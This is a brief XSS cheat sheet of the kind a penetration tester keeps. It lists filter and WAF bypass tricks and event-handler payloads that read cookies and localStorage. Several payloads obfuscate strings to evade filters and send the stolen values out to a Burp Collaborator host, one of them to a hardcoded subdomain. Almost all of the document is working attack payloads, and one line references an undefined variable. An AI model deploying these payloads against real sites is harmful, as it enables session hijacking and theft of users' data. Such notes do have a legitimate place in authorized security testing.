# XSS

## XSS

* Mindmap : [https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png) [https://github.com/s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
* Si `alert()`is forbiden use`a=alert;a(1)`
* Test all the HTML event : https://www.w3schools.com/tags/ref\_eventattributes.asp

```
<b onwheel="a=prompt;a(1)">test</b>
```

* The %00 can allow `onload `to bypass the WAF `onload%00`
* Steel cookies & localstorage

```
<b onwheel="a=prompt;d=document;a(d.cookie)">test</b>
<b onwheel="a=prompt;a(localStorage[localStorage.key(0)])">test</b>
```

* Bypass WAF exfiltrating using Burp Collaborator

```
<b onwheel="new Image().src='https://<RANDOM>.bu'+'rpcollaborator'+'.net/?c=test'">test</b>
<b onwheel="new Image().src='https://<RANDOM>.bu'+'rpcollaborator'+'.net/?c='+localStorage[localStorage.key(0)]">test</b>
<b onwheel="d='doc';u='ument';f=Function;e=new f('return ' + d + u)();new Image().src='https://<RANDOM>.bu'+'rpcollaborator'+'.net/?c='+e">test</b>
<b onwheel="d='doc';u='ument';w=window;new Image().src='https://<RANDOM>.bu'+'rpcollaborator'+'.net/?c='+e">test</b>
<b onwheel="d='doc';u='ument';ck=self[d+u]['cookie'];new Image().src='https://bxcksiuskwnuvx7z58gmf1h20t6ku9.bu'+'rpcollaborator'+'.net/?c='+ck">test</b>
```

* `setTimeout(eval(alert(1)))`
